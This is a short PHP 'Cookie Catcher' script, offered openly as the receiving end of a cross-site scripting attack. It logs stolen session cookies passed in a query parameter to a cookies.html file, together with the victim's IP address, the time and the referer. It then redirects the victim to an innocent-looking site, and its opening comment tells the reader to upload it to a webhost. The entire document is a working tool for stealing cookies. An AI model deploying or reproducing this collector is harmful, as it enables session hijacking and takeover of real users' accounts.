// Cookie Catcher / XSS Script to get cookies from a User.
// Should work if you upload to your webhost :)

<?php
$cookie = $_GET['c'];
 $ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cookies.html', 'a');
fwrite($fp, 'Cookie: '.$cookie.'< br > IP: ' .$ip. '< br > Date and Time: ' .$date. '< br > Referer: '.$referer.'< br > < br > < br >');
fclose($fp);
header ("Location: http://website.com");
?>
<HTML></HTML>